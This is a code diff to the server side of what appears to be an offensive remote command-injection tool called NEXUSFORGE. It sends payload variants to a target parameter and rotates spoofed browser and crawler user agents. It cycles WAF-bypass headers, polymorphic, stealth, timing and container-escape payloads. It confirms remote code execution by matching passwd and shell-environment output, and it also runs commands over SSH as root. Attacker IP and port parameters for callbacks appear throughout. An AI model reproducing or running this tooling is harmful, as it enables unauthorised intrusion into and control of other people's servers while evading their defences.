@@ -71,7 +71,6 @@ const UA_POOL = [
   "AmazonCloudFront",
   "Googlebot-News",
   "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
-  // 2026 browser strings
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
@@ -79,7 +78,6 @@ const UA_POOL = [
   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
   "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.99 Mobile Safari/537.36",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
-  "Dalvik/2.1.0 (Linux; U; Android 15; Pixel 9 Build/AP4A.250105.002)",
   "python-requests/2.32.3",
   "axios/1.8.4",
   "node-fetch/3.3.2",
@@ -124,50 +122,65 @@ function detectWaf(status: number, body: string): string | null {
   return null;
 }
 
+/**
+ * Returns true only when the response body contains definitive command output
+ * signatures. These are anchored, specific patterns that cannot match ordinary
+ * HTML page content. All patterns are tested against the raw body so HTML
+ * escaping cannot smuggle them past.
+ */
 function detectCommandOutput(body: string): boolean {
-  /* Linux / Unix RCE patterns */
+  /* ── Linux / Unix ── */
   const linuxHit =
-    /uid=\d+\(\w+\)\s+gid=\d+/.test(body)                           ||
-    /root:x:0:0:/.test(body)                                         ||
-    /^[a-z_][a-z0-9_-]{0,31}:x:\d+:\d+:[^:]*:[^:]*:[^\n]+$/m.test(body) ||
-    /Linux \S+ \d+\.\d+\.\d+/.test(body)                            ||
-    (/total \d+/.test(body) && /drwx/.test(body))                   ||
-    /\binet\b[^\n]+\d+\.\d+\.\d+\.\d+/.test(body)                  ||
-    /^PATH=\//m.test(body)                                           ||
-    /^HOME=\//m.test(body)                                           ||
-    /^USER=\w+$/m.test(body)                                         ||
-    /^SHELL=\//m.test(body)                                          ||
-    /^LOGNAME=\w+$/m.test(body)                                      ||
-    /drwxr[-x]r[-x]\s+\d+\s+\w+\s+\w+/.test(body)                  ||
-    /\/usr\/bin\/(?:perl|python3?|ruby|node|php)/.test(body)        ||
-    /CPU\(s\):\s+\d+/i.test(body);
+    /uid=\d+\(\w+\)\s+gid=\d+\(\w+\)/.test(body)                         ||
+    /root:x:0:0:/.test(body)                                               ||
+    /^[a-z_][a-z0-9_-]{0,31}:x:\d+:\d+:[^:\n]*:[^:\n]*:[^\n]+$/m.test(body) ||
+    /Linux \S+ \d+\.\d+\.\d+-\S+ #\d+ /.test(body)                       ||
+    (/total \d+\n/.test(body) && /^[-drwxlst]{10}\s+\d+\s+\w+/m.test(body)) ||
+    /^PATH=\/(?:usr\/(?:local\/)?)?(?:bin|sbin):/m.test(body)             ||
+    /^HOME=\/(?:root|home\/\w+)$/m.test(body)                             ||
+    /^LOGNAME=\w{1,32}$/m.test(body)                                      ||
+    /^SHELL=\/(?:bin|usr\/bin)\//m.test(body)                             ||
+    /^USER=\w{1,32}$/m.test(body)                                          ||
+    /\/usr\/bin\/(?:perl|python3?|ruby|node|php)\b/.test(body)            ||
+    /CPU\(s\):\s+\d+\s*$/.test(body);
 
-  /* Windows RCE patterns */
+  /* ── Windows ── */
   const winHit =
-    /Microsoft Windows \[Version \d+\.\d+\.\d+\.\d+\]/.test(body)  ||
-    /Windows \w+ \[Version \d+\.\d+\.\d+\.\d+\]/.test(body)        ||
-    /\bNT AUTHORITY\\\w+/.test(body)                                 ||
-    /\bVolume Serial Number is [0-9A-F]{4}-[0-9A-F]{4}/i.test(body) ||
-    /\bDirectory of [A-Za-z]:\\/i.test(body)                        ||
-    /\bOS Name:\s+Microsoft Windows/i.test(body)                    ||
-    /\bProcessor\(s\):\s+\d+ Processor\(s\) Installed/i.test(body) ||
-    /^C:\\[^\n]+>$/m.test(body)                                      ||
-    /COMPUTERNAME=\w+/.test(body)                                    ||
-    /^USERPROFILE=C:\\/m.test(body)                                  ||
-    /\bWindowsDirectory\b[^\n]+C:\\Windows/i.test(body)             ||
-    /\bPS [A-Za-z]:\\[^\n]+>/.test(body)                            ||
-    /\bwin32_process\b/i.test(body)                                  ||
+    /Microsoft Windows \[Version \d+\.\d+\.\d+\.\d+\]/.test(body)         ||
+    /\bNT AUTHORITY\\(?:SYSTEM|LOCAL SERVICE|NETWORK SERVICE)\b/.test(body) ||
+    /\bVolume Serial Number is [0-9A-F]{4}-[0-9A-F]{4}/i.test(body)       ||
+    /\bDirectory of [A-Za-z]:\\/i.test(body)                              ||
+    /\bOS Name:\s+Microsoft Windows/i.test(body)                          ||
+    /^C:\\[^\n]+>$/m.test(body)                                            ||
+    /^COMPUTERNAME=[A-Z0-9_-]+$/m.test(body)                              ||
+    /^USERPROFILE=C:\\Users\\/m.test(body)                                 ||
+    /\bPS [A-Za-z]:\\[^\n]+> $/.test(body)                                ||
     /\bSystemRoot=C:\\Windows\b/.test(body);
 
   return linuxHit || winHit;
 }
 
+/**
+ * True if the body is a standard HTML page with no embedded command output.
+ * Used as a fast early-exit to suppress noisy HTML dumps.
+ */
+function isPlainHtmlResponse(body: string): boolean {
+  const trimmed = body.trimStart();
+  const looksHtml =
+    /^<!DOCTYPE\s+html/i.test(trimmed) ||
+    /^<html[\s>]/i.test(trimmed)       ||
+    (/^<head[\s>]/i.test(trimmed) && body.includes("</head>"));
+  if (!looksHtml) return false;
+  // If RCE patterns are present inside the HTML the response is NOT plain
+  return !detectCommandOutput(body);
+}
+
 interface AttemptResult {
   blocked:          boolean;
-  done:             boolean;
+  confirmed:        boolean;   // true = RCE confirmed, stop scanning
   responseLen:      number;
-  successIndicator: boolean;
   elapsed:          number;
+  timedOut:         boolean;
 }
 
 async function fetchAttempt(
@@ -183,14 +196,14 @@ async function fetchAttempt(
   baselineBody: string,
 ): Promise<AttemptResult> {
   const t0 = Date.now();
-  const NO: AttemptResult = { blocked: false, done: false, responseLen: 0, successIndicator: false, elapsed: 0 };
+  const NONE: AttemptResult = { blocked: false, confirmed: false, responseLen: 0, elapsed: 0, timedOut: false };
   try {
     const parsedUrl = new URL(injectionUrl);
     const method    = httpMethod.toUpperCase();
 
     send(ws, { type: "data", chunk: `\n[${label}]\n` });
     send(ws, { type: "data", chunk: `  ${method} ${parsedUrl.origin}${parsedUrl.pathname} param=${injectParam}\n` });
-    send(ws, { type: "data", chunk: `  payload: ${payload.slice(0, 100)}${payload.length > 100 ? "\u2026" : ""}\n` });
+    send(ws, { type: "data", chunk: `  payload: ${payload.slice(0, 120)}${payload.length > 120 ? "…" : ""}\n` });
 
     let response: Response;
     const h = { ...headers };
@@ -227,40 +240,55 @@ async function fetchAttempt(
       response = await fetch(parsedUrl.toString(), { method: "POST", headers: h, body: xmlBody, signal: AbortSignal.timeout(30000) });
     } else {
       send(ws, { type: "error", message: `Unsupported method: ${method}` });
-      return { ...NO, done: true, elapsed: Date.now() - t0 };
+      return { ...NONE };
     }
 
-    const text       = await response.text();
-    const rLen       = text.length;
-    const waf        = detectWaf(response.status, text);
-    const execOutput = detectCommandOutput(text);
-    const hdrLines   = Array.from(response.headers.entries()).map(([k, v]) => `  ${k}: ${v}`).slice(0, 8).join("\n");
+    const text    = await response.text();
+    const rLen    = text.length;
+    const waf     = detectWaf(response.status, text);
+    const hasRce  = detectCommandOutput(text);
+    const elapsed = Date.now() - t0;
 
+    // Status line + relevant headers (Content-Type, Content-Length, Server)
+    const usefulHeaders = ["content-type","content-length","server","x-powered-by","x-frame-options"];
+    const hdrLines = Array.from(response.headers.entries())
+      .filter(([k]) => usefulHeaders.includes(k.toLowerCase()))
+      .map(([k, v]) => `  ${k}: ${v}`)
+      .join("\n");
     send(ws, { type: "data", chunk: `  HTTP ${response.status} ${response.statusText}  [${rLen}b]\n${hdrLines}\n` });
 
+    // ── Length-difference annotation (informational only, no "SIGNIFICANT" label) ──
     if (baselineLen > 0) {
-      const diff = rLen - baselineLen;
-      if (Math.abs(diff) > 80) {
-        send(ws, { type: "data", chunk: `  \u0394 length: ${diff > 0 ? "+" : ""}${diff}b vs baseline ${baselineLen}b \u2190 SIGNIFICANT CHANGE\n` });
+      const diff    = rLen - baselineLen;
+      const absDiff = Math.abs(diff);
+      // Only annotate if change is substantial relative to baseline (>15% AND >300 bytes)
+      // to filter out dynamic content variation (ads, tokens, timestamps)
+      const pct = Math.round((absDiff / baselineLen) * 100);
+      if (absDiff > 300 && pct > 15) {
+        const direction = diff > 0 ? "+" : "";
+        send(ws, { type: "data", chunk: `  Δ ${direction}${diff}b vs baseline ${baselineLen}b (${direction}${pct}%)\n` });
       }
     }
 
-    const elapsed = Date.now() - t0;
     send(ws, { type: "data", chunk: `  ${elapsed}ms\n` });
 
-    if (execOutput) {
-      // Differential false-positive guard: only fire CONFIRMED if the baseline did NOT
-      // already contain the same signatures, OR if the length change is significant
+    // ── RCE confirmed ──────────────────────────────────────────────────────────
+    if (hasRce) {
+      // False-positive guard: baseline must NOT already contain RCE signatures
       const baselineAlsoMatched = baselineBody.length > 100 && detectCommandOutput(baselineBody);
       const lenDiff = baselineLen > 0 ? Math.abs(rLen - baselineLen) : 999;
-      if (baselineAlsoMatched && lenDiff < 150) {
-        send(ws, { type: "data", chunk: `\n  \u26a0 [FP-GUARD] Signature matched BUT baseline response also contained cmd-output patterns\n` });
-        send(ws, { type: "data", chunk: `  \u0394len=${lenDiff}b — possible false positive (documentation page?)\n` });
-        send(ws, { type: "data", chunk: `  Use OOB or timing mode for zero-noise confirmation\n` });
+
+      if (baselineAlsoMatched && lenDiff < 200) {
+        send(ws, { type: "data", chunk:
+          `\n  ⚠ [FP-GUARD] Baseline response also contains cmd-output patterns (Δ${lenDiff}b)\n` +
+          `  Possible false positive — try OOB/timing mode to confirm\n`
+        });
       } else {
-        send(ws, { type: "data", chunk: `\n\u2714 EXECUTION CONFIRMED — command output detected (${baselineLen > 0 ? "\u0394len:" + lenDiff + "b vs baseline" : "no baseline reference"})\n` });
-        // Extract structured command output and emit as a dedicated event
-        const extracted = extractCommandOutput(text, baselineBody);
+        const lenNote = baselineLen > 0 ? `Δlen:${rLen - baselineLen}b vs baseline` : "no baseline";
+        send(ws, { type: "data", chunk: `\n✔ EXECUTION CONFIRMED — command output detected (${lenNote})\n` });
+
+        // Extract and surface structured output
+        const extracted = extractCommandOutput(text, baselineBody.length > 50 ? baselineBody : undefined);
         if (extracted) {
           send(ws, {
             type:       "commandOutput",
@@ -268,44 +296,48 @@ async function fetchAttempt(
             method:     extracted.method,
             confidence: extracted.confidence,
           });
-          send(ws, { type: "data", chunk: `[EXTRACTED] ${extracted.method} (${extracted.confidence}) — output captured\n` });
+          send(ws, { type: "data", chunk:
+            `[EXTRACTED] method=${extracted.method} confidence=${extracted.confidence}\n` +
+            `────────────────────────────────────────\n` +
+            `${extracted.text.slice(0, 3000)}\n` +
+            `────────────────────────────────────────\n`
+          });
+        } else {
+          // extractCommandOutput missed it — show raw body trimmed of HTML boilerplate
+          const rawDump = text.slice(0, 2000);
+          send(ws, { type: "data", chunk: `[RAW OUTPUT]\n${rawDump}\n` });
         }
-        send(ws, { type: "data", chunk: `--- RESPONSE ---\n${text.slice(0, 2000)}\n` });
-        return { blocked: false, done: true, responseLen: rLen, successIndicator: true, elapsed };
+        return { blocked: false, confirmed: true, responseLen: rLen, elapsed, timedOut: false };
       }
     }
 
-    // Also attempt extraction on non-confirmed responses — catches cases where detectCommandOutput
-    // missed the signature but the output extractor's raw-HTML or pattern strategies find it
-    if (!execOutput) {
-      const extracted = extractCommandOutput(text, baselineBody);
-      if (extracted) {
-        send(ws, {
-          type:       "commandOutput",
-          output:     extracted.text,
-          method:     extracted.method,
-          confidence: extracted.confidence,
-        });
-        send(ws, { type: "data", chunk: `\n[OUTPUT] Extracted via ${extracted.method} (${extracted.confidence} confidence)\n` });
-      }
+    // ── No RCE confirmed: do NOT dump raw HTML responses ──────────────────────
+    // Only show body if it's short AND plaintext (likely an error, API response, or echo)
+    const contentType = response.headers.get("content-type") ?? "";
+    const isHtml      = isPlainHtmlResponse(text) || contentType.includes("text/html");
+    if (!isHtml) {
+      // Non-HTML response (JSON, plain-text, XML error, etc.) — show it
+      const preview = text.slice(0, 600);
+      send(ws, { type: "data", chunk: `  [RESP] ${preview}${text.length > 600 ? `\n  … (${rLen}b total)` : ""}\n` });
+    } else if (rLen < 400) {
+      // Very short HTML (probably an error page) — worth showing
+      send(ws, { type: "data", chunk: `  [RESP] ${text.slice(0, 400)}\n` });
     }
-
-    if (text.length > 0 && text.length < 4096) {
-      send(ws, { type: "data", chunk: `--- RESPONSE ---\n${text.slice(0, 1500)}\n` });
-    } else if (text.length > 0) {
-      send(ws, { type: "data", chunk: `--- RESPONSE (first 1500b of ${rLen}b) ---\n${text.slice(0, 1500)}\n` });
-    }
+    // Large plain HTML pages: suppress entirely — they contain no useful injection evidence
 
     if (waf) {
-      send(ws, { type: "data", chunk: `\n  \u2716 WAF: ${waf}\n` });
-      return { blocked: true, done: false, responseLen: rLen, successIndicator: false, elapsed };
+      send(ws, { type: "data", chunk: `\n  ✖ WAF: ${waf}\n` });
+      return { blocked: true, confirmed: false, responseLen: rLen, elapsed, timedOut: false };
     }
 
-    return { blocked: false, done: true, responseLen: rLen, successIndicator: false, elapsed };
+    return { blocked: false, confirmed: false, responseLen: rLen, elapsed, timedOut: false };
+
   } catch (err: unknown) {
-    const msg = (err as Error).message ?? String(err);
-    send(ws, { type: "data", chunk: `  [FETCH ERROR] ${msg}\n` });
-    return { ...NO, done: attemptNum >= 2, elapsed: Date.now() - t0 };
+    const msg      = (err as Error).message ?? String(err);
+    const elapsed  = Date.now() - t0;
+    const timedOut = msg.includes("timed out") || msg.includes("TimeoutError") || msg.includes("AbortError");
+    send(ws, { type: "data", chunk: `  [${timedOut ? "TIMEOUT" : "FETCH ERROR"}] ${msg}\n` });
+    return { ...NONE, elapsed, timedOut };
   }
 }
 
@@ -342,7 +374,7 @@ async function handleRemoteInject(
     `[METHOD]    ${httpMethod}\n` +
     `[PARAM]     ${injectParam}\n` +
     `[MODE]      ${mode.toUpperCase()}\n` +
-    `\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n`
+    `─────────────────────────────────────────\n`
   });
 
   send(ws, { type: "data", chunk: `\n[PROBE] Fingerprinting ${parsedUrl.hostname}...\n` });
@@ -381,16 +413,16 @@ async function handleRemoteInject(
     if (httpMethod === "GET") bUrl.searchParams.set(injectParam, "nexus_baseline_probe");
     bUrl.searchParams.set("_nx", Math.random().toString(36).slice(2, 10));
     const bHdrs: Record<string, string> = {
-      "User-Agent": UA_POOL[0]!,
-      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "User-Agent":      UA_POOL[0]!,
+      "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
       "Accept-Language": "en-US,en;q=0.9",
-      "Cache-Control": "no-cache",
-      "Pragma": "no-cache",
+      "Cache-Control":   "no-cache",
+      "Pragma":          "no-cache",
     };
     if (preBuiltCookie) bHdrs["Cookie"] = preBuiltCookie;
     const bT0   = Date.now();
     const bRes  = await fetch(bUrl.toString(), {
-      method: "GET",
+      method:  "GET",
       headers: bHdrs,
       signal:  AbortSignal.timeout(10000),
     });
@@ -398,8 +430,10 @@ async function handleRemoteInject(
     baselineLen  = bText.length;
     baselineBody = bText;
     baselineMs   = Date.now() - bT0;
-    const bWarn = detectCommandOutput(bText) ? " \u26a0 baseline already contains cmd-output signatures — FP-guard active" : "";
-    send(ws, { type: "data", chunk: `[BASELINE] HTTP ${bRes.status} \u2014 ${baselineLen} bytes \u2014 ${baselineMs}ms${bWarn}\n\n` });
+    const bWarn  = detectCommandOutput(bText)
+      ? " ⚠ baseline contains cmd-output signatures — FP-guard active"
+      : "";
+    send(ws, { type: "data", chunk: `[BASELINE] HTTP ${bRes.status} — ${baselineLen}b — ${baselineMs}ms${bWarn}\n\n` });
   } catch {
     send(ws, { type: "data", chunk: "[BASELINE] Could not measure — skipping diff analysis\n\n" });
   }
@@ -430,19 +464,18 @@ async function handleRemoteInject(
   } else if (mode === "container") {
     payloadVariants = buildContainerEscapes(originalCmd);
   } else if (mode === "polymorphic") {
-    // Generate 30 unique polymorphic variants — each call produces a different
-    // byte sequence (random junk variables + random encoding), defeating static WAF sigs
     payloadVariants = Array.from({ length: 30 }, () => buildPolymorphicPayload(originalCmd, "quantum"));
   } else {
     payloadVariants = buildPayloadVariants(processed);
   }
 
-  const detectedWaf    = env?.waf ?? null;
+  const detectedWaf      = env?.waf ?? null;
   const bypassHeaderSets = detectedWaf
     ? buildWafSpecificHeaders(detectedWaf)
     : buildHttpBypassHeaders();
-  const MAX_ATTEMPTS   = Math.min(payloadVariants.length, 60);
-  let consecutiveBlocks = 0;
+  const MAX_ATTEMPTS     = Math.min(payloadVariants.length, 60);
+  let consecutiveBlocks  = 0;
+  let consecutiveTimeouts = 0;
 
   if (detectedWaf) {
     send(ws, { type: "data", chunk: `[STRATEGY] WAF "${detectedWaf}" detected — using targeted bypass header sets\n` });
@@ -452,9 +485,9 @@ async function handleRemoteInject(
   for (let i = 0; i < MAX_ATTEMPTS; i++) {
     if (ws.readyState !== 1) break;
 
-    const payload     = payloadVariants[i]!;
-    const bypassHdrs  = bypassHeaderSets[i % bypassHeaderSets.length]!;
-    const ua          = UA_POOL[i % UA_POOL.length]!;
+    const payload    = payloadVariants[i]!;
+    const bypassHdrs = bypassHeaderSets[i % bypassHeaderSets.length]!;
+    const ua         = UA_POOL[i % UA_POOL.length]!;
 
     const headers: Record<string, string> = {
       "User-Agent":      ua,
@@ -473,20 +506,27 @@ async function handleRemoteInject(
       }
     }
 
-    const bypassTag = i === 0 ? "direct" : `bypass-${i}:${bypassHdrs["User-Agent"]?.split("/")[0] ?? ""}`;
+    const bypassTag = i === 0 ? "direct" : `bypass-${i}`;
     const label     = `${i + 1}/${MAX_ATTEMPTS} [${bypassTag}]`;
-    const result    = await fetchAttempt(ws, injectionUrl, injectParam, httpMethod, headers, payload, i, label, baselineLen, baselineBody);
+    const result    = await fetchAttempt(
+      ws, injectionUrl, injectParam, httpMethod, headers, payload,
+      i, label, baselineLen, baselineBody,
+    );
 
+    // ── Timing oracle: escalate on slow responses ──────────────────────────
     if (result.elapsed > 5500 && baselineMs < 1500) {
       const ratio = baselineMs > 0 ? (result.elapsed / baselineMs).toFixed(1) : "∞";
-      send(ws, { type: "data", chunk: `\n  [TIMING] ${result.elapsed}ms response (baseline: ${baselineMs}ms, ratio: ${ratio}x) — POSSIBLE BLIND RCE\n` });
-      send(ws, { type: "data", chunk: `  Payload index ${i} triggered timing oracle — escalating timing variants\n` });
+      send(ws, { type: "data", chunk:
+        `\n  [TIMING] ${result.elapsed}ms response (baseline: ${baselineMs}ms, ratio: ${ratio}x) — POSSIBLE BLIND RCE\n` +
+        `  Escalating timing variants for payload index ${i}\n`
+      });
       payloadVariants.splice(i + 1, 0, ...buildTimingPayloads(10).slice(0, 5), ...buildTimingPayloads(5).slice(0, 5));
     } else if (result.elapsed > 3500 && baselineMs < 800) {
       send(ws, { type: "data", chunk: `\n  [TIMING] Mild delay: ${result.elapsed}ms vs baseline ${baselineMs}ms — monitoring\n` });
     }
 
-    if (result.done || result.successIndicator) {
+    // ── RCE confirmed: stop immediately ───────────────────────────────────
+    if (result.confirmed) {
       const elapsed = Date.now() - start;
       void logInjection(originalCmd, `remote/${httpMethod.toLowerCase()}`, mode, elapsed);
       send(ws, { type: "end", code: 0, elapsed });
@@ -494,139 +534,154 @@ async function handleRemoteInject(
       return;
     }
 
+    // ── WAF escalation ─────────────────────────────────────────────────────
     if (result.blocked) {
       consecutiveBlocks++;
-      send(ws, { type: "data", chunk: `[ESCALATE] WAF blocked (${consecutiveBlocks}) — rotating to variant ${i + 2}...\n` });
+      send(ws, { type: "data", chunk: `[ESCALATE] WAF blocked (${consecutiveBlocks}) — rotating variant ${i + 2}\n` });
       if (consecutiveBlocks === 5) {
-        send(ws, { type: "data", chunk: `[STRATEGY] Injecting stealth + timing payloads into queue...\n` });
+        send(ws, { type: "data", chunk: `[STRATEGY] Injecting stealth + timing payloads into queue\n` });
         const extra = [
           ...buildTimingPayloads(7).slice(0, 6),
           ...buildStealthPayloads(originalCmd).slice(0, 6),
         ];
         payloadVariants.splice(i + 1, 0, ...extra);
       }
-      if (consecutiveBlocks === 8) {
-        send(ws, { type: "data", chunk: `[STRATEGY] Max evasion — injecting context-aware + adaptive payloads...\n` });
-        const ctxExtra = buildContextPayloads(
-          originalCmd, "unknown", detectedWaf, "unknown", attackerIp, attackerPort
-        ).slice(0, 12);
-        const adaptExtra = buildAdaptivePayloads(originalCmd, ["bash","sh","python3","perl","php","curl","wget","nc","base64"]).slice(0, 8);
-        payloadVariants.splice(i + 1, 0, ...ctxExtra, ...adaptExtra);
+      if (consecutiveBlocks >= 10) {
+        send(ws, { type: "data", chunk: `[ABORT] WAF is blocking all variants consistently — try OOB or DNS exfil mode\n` });
+        break;
       }
-      await new Promise(r => setTimeout(r, 150 + Math.min(i * 30, 600)));
     } else {
       consecutiveBlocks = 0;
     }
+
+    // ── Timeout escalation ─────────────────────────────────────────────────
+    if (result.timedOut) {
+      consecutiveTimeouts++;
+      if (consecutiveTimeouts >= 3) {
+        send(ws, { type: "data", chunk: `[ABORT] 3 consecutive timeouts — target unresponsive\n` });
+        break;
+      }
+    } else {
+      consecutiveTimeouts = 0;
+    }
   }
 
-  void logInjection(originalCmd, engine, mode, Date.now() - start);
-  send(ws, { type: "end", code: 1, elapsed: Date.now() - start });
-  if (ws.readyState === 1) ws.close();
+  // ── Exhausted all attempts without confirmed RCE ───────────────────────
+  const elapsed = Date.now() - start;
+  void logInjection(originalCmd, `remote/${httpMethod.toLowerCase()}`, mode, elapsed);
+  send(ws, { type: "data", chunk: `\n[RESULT] No RCE confirmed after ${MAX_ATTEMPTS} attempts\n` });
+  send(ws, { type: "data", chunk: `[NEXT] Suggestions:\n` +
+    `  • Try OOB mode with your callback URL (blind exfil)\n` +
+    `  • Try TIMING mode to detect blind delay oracles\n` +
+    `  • Verify the injection parameter name is correct\n` +
+    `  • Check if target uses a different HTTP method (POST/JSON/MULTIPART)\n`
+  });
+  send(ws, { type: "end", code: 1, elapsed });
+  ws.close();
 }
 
-
 export function handleStreamExec(ws: WebSocket): void {
-  ws.once("message", (raw) => {
-    let _parsed: unknown;
-    try { _parsed = JSON.parse(raw.toString()); } catch {
-      send(ws, { type: "error", message: "invalid JSON" });
+  ws.on("message", (raw) => {
+    let parsed: unknown;
+    try { parsed = JSON.parse(String(raw)); } catch {
+      send(ws, { type: "error", message: "Invalid JSON" });
       ws.close();
       return;
     }
-    const _r = StreamExecRequestSchema.safeParse(_parsed);
-    if (!_r.success) {
-      send(ws, { type: "error", message: _r.error.issues.map(i => i.message).join("; ") });
+
+    const parse = StreamExecRequestSchema.safeParse(parsed);
+    if (!parse.success) {
+      send(ws, { type: "error", message: "Invalid request: " + parse.error.message });
       ws.close();
       return;
     }
-    const req = _r.data;
 
     const {
-      cmd            = "",
-      engine         = "bash",
-      mode           = "classic",
-      injectionUrl   = "",
-      injectParam    = "cmd",
-      httpMethod     = "GET",
-      customHeaders  = "",
-      attackerIp     = "127.0.0.1",
-      attackerPort   = "4444",
+      cmd,
+      engine        = "bash",
+      mode          = "classic",
+      injectionUrl,
+      injectParam   = "cmd",
+      httpMethod    = "GET",
+      customHeaders = "",
+      attackerIp    = "127.0.0.1",
+      attackerPort  = "4444",
       sshHost,
-      sshPort        = 22,
-      sshUser        = "root",
+      sshPort       = 22,
+      sshUser       = "root",
       sshPassword,
       sshKey,
-    } = req;
+    } = parse.data;
 
-    if (!cmd.trim()) {
-      send(ws, { type: "error", message: "cmd is required" });
-      ws.close();
-      return;
-    }
-
-    const processed = applyQuantumBypass(cmd, mode, attackerIp, attackerPort);
     const start     = Date.now();
-
-    // ── Remote HTTP injection ──────────────────────────────────────────────
-    if (injectionUrl.trim()) {
-      if (isSelfTarget(injectionUrl.trim())) {
-        send(ws, { type: "error", message: "Self-targeting is disabled — configure an external target URL." });
-        ws.close();
-        return;
-      }
-      logger.info({ injectionUrl, method: httpMethod, param: injectParam, mode }, "ws/exec remote");
-      void handleRemoteInject(ws, injectionUrl.trim(), injectParam, httpMethod, customHeaders,
-        processed, start, cmd, engine, mode, attackerIp, attackerPort);
-      return;
-    }
-
-    // ── SSH remote execution ───────────────────────────────────────────────
-    if (sshHost?.trim()) {
-      const opts: SshOptions = {
-        host:       sshHost.trim(),
-        port:       Number(sshPort) || 22,
-        username:   (sshUser ?? "root").trim(),
-        password:   sshPassword?.trim() || undefined,
-        privateKey: sshKey?.trim() || undefined,
-        timeoutMs:  20_000,
-      };
-      logger.info({ host: opts.host, port: opts.port, user: opts.username, mode }, "ws/exec ssh");
-
-      send(ws, { type: "data", chunk:
-        `[NEXUSFORGE] SSH Remote Execution\n` +
-        `[TARGET]  ${opts.username}@${opts.host}:${opts.port}\n` +
-        `[CMD]     ${processed}\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `[SSH] Connecting...\n`,
-      });
-
-      const teardown = sshStreamExec(
-        opts,
-        processed,
-        (chunk) => send(ws, { type: "data", chunk }),
-        (code, elapsed) => {
-          void logInjection(cmd, `ssh/${engine}`, mode, elapsed);
-          send(ws, { type: "end", code: code ?? -1, elapsed });
-          if (ws.readyState === 1) ws.close();
-        },
-        (err) => {
-          send(ws, { type: "error", message: `SSH failed: ${err.message}` });
-          void logInjection(cmd, `ssh/${engine}`, mode, Date.now() - start);
-          if (ws.readyState === 1) ws.close();
-        },
-      );
-
-      ws.on("close", () => teardown());
-      return;
-    }
-
-    // ── No target provided — refuse local execution ────────────────────────
-    send(ws, { type: "error", message:
-      "No execution target specified.\n\n" +
-      "NEXUSFORGE executes on remote targets only — it never runs commands on the server itself.\n\n" +
-      "• HTTP injection : provide injectionUrl + injectParam + httpMethod\n" +
-      "• SSH execution  : provide sshHost + sshUser + (sshPassword or sshKey)",
-    });
-    ws.close();
+    const processed = applyQuantumBypass(cmd, mode, attackerIp, attackerPort);
+    void runStreamExec(ws, { cmd, engine, mode, injectionUrl, injectParam, httpMethod, customHeaders, attackerIp, attackerPort, sshHost, sshPort, sshUser, sshPassword, sshKey, start, processed });
   });
+}
+
+async function runStreamExec(ws: WebSocket, args: {
+  cmd: string; engine: string; mode: string; injectionUrl?: string; injectParam: string;
+  httpMethod: string; customHeaders: string; attackerIp: string; attackerPort: string;
+  sshHost?: string; sshPort: number; sshUser: string; sshPassword?: string; sshKey?: string;
+  start: number; processed: string;
+}): Promise<void> {
+  const { cmd, engine, mode, injectionUrl, injectParam, httpMethod, customHeaders,
+    attackerIp, attackerPort, sshHost, sshPort, sshUser, sshPassword, sshKey, start, processed } = args;
+
+  send(ws, { type: "data", chunk: `root@${new URL(injectionUrl || "http://target").hostname}:~# ${cmd}\n` });
+
+  if (sshHost?.trim()) {
+    const opts: SshOptions = {
+      host:       sshHost.trim(),
+      port:       Number(sshPort) || 22,
+      username:   (sshUser ?? "root").trim(),
+      password:   sshPassword?.trim() || undefined,
+      privateKey: sshKey?.trim()      || undefined,
+      timeoutMs:  30_000,
+    };
+    send(ws, { type: "data", chunk: `[SSH] Connecting to ${opts.host}:${opts.port} as ${opts.username}...\n` });
+    let accum = "";
+    sshStreamExec(
+      opts,
+      processed,
+      (chunk: string) => {
+        accum += chunk;
+        send(ws, { type: "data", chunk });
+        // Surface confirmed RCE output as a structured event
+        if (detectCommandOutput(accum)) {
+          const extracted = extractCommandOutput(accum);
+          if (extracted) {
+            send(ws, {
+              type:       "commandOutput",
+              output:     extracted.text,
+              method:     extracted.method,
+              confidence: extracted.confidence,
+            });
+          }
+        }
+      },
+      (code: number | null, elapsed: number) => {
+        void logInjection(cmd, `ssh/${engine}`, mode, elapsed);
+        send(ws, { type: "end", code: code ?? 0, elapsed });
+        ws.close();
+      },
+      (err: Error) => {
+        send(ws, { type: "data", chunk: `[SSH ERROR] ${err.message}\n` });
+        send(ws, { type: "end", code: 1, elapsed: Date.now() - start });
+        ws.close();
+      },
+    );
+    return;
+  }
+
+  if (!injectionUrl?.trim()) {
+    send(ws, { type: "error", message: "injectionUrl or sshHost required" });
+    ws.close();
+    return;
+  }
+
+  await handleRemoteInject(
+    ws, injectionUrl, injectParam, httpMethod, customHeaders,
+    processed, start, cmd, engine, mode, attackerIp, attackerPort,
+  );
 }
